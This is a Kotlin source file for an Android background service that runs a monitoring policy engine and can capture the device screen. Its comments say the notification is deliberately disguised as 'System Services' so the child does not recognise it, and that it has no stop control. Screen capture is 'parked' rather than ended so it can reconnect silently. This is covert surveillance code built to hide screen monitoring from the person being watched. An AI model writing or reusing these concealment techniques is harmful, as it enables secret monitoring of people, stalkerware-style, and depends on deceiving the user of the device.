package org.pairdroid.pairdroid

import android.app.*
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.IBinder
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class LanService : Service() {
    private val ticker = Executors.newSingleThreadScheduledExecutor()
    private lateinit var engine: LanEngine
    override fun onCreate() {
        super.onCreate(); engine = LanEngine.get(this)
        // Use IMPORTANCE_MIN: no sound, no heads-up banner, collapsed in notification shade.
        // Channel name disguised as "System Services" so the child doesn't identify it.
        getSystemService(NotificationManager::class.java).createNotificationChannel(
            NotificationChannel("management", "System Services", NotificationManager.IMPORTANCE_MIN).apply {
                description = "Background system component"
                setShowBadge(false)
            }
        )
        ticker.scheduleAtFixedRate({
            try { engine.tick() } catch(e: Exception) { engine.error = "Policy evaluation: ${e.message}" }
            if(engine.capture.active && android.os.SystemClock.elapsedRealtime() - engine.lastFramePoll > 15000) engine.stopSharing()
            getSystemService(NotificationManager::class.java).notify(1, notification())
        }, 1, 5, TimeUnit.SECONDS)
    }
    private fun notification(): Notification {
        // No action buttons — child cannot stop the service from the notification.
        // Title is generic so child won't know what this service does.
        return Notification.Builder(this, "management")
            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
            .setContentTitle("System Services")
            .setContentText("Running background sync")
            .setOngoing(true)
            .setShowWhen(false)
            .build()
    }
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if(intent?.action == "STOP") { stopSelf(); return START_NOT_STICKY }
        if(intent?.action == "STOP_SHARE") {
            // Park (not stop) — keeps projection token alive for silent reconnect.
            engine.parkSharing()
            getSystemService(NotificationManager::class.java).notify(1, notification())
            return START_NOT_STICKY
        }
        try {
            val capture = intent?.action == "CAPTURE"
            val type = ServiceInfo.FOREGROUND_SERVICE_TYPE_CONNECTED_DEVICE or
                if(capture || engine.capture.active || engine.capture.parked) ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION else 0
            if(android.os.Build.VERSION.SDK_INT >= 29) startForeground(1,notification(),type) else startForeground(1,notification())
            engine.start()
            if(capture) {
                @Suppress("DEPRECATION") val consent = intent!!.getParcelableExtra<Intent>("consent")!!
                engine.beginSharing(intent.getStringExtra("pin")!!,intent.getIntExtra("result",0),consent)
                getSystemService(NotificationManager::class.java).notify(1,notification())
            }
        } catch(e: Exception) { engine.error = e.message ?: "Could not start service"; engine.journal.add("Service error: ${engine.error}"); engine.stopSharing(); if(!engine.running) stopSelf() }
        return START_NOT_STICKY // User explicitly restarts management after OS termination/reboot.
    }
    override fun onDestroy() { ticker.shutdownNow(); engine.stop(); super.onDestroy() }
    override fun onBind(intent: Intent?): IBinder? = null
}

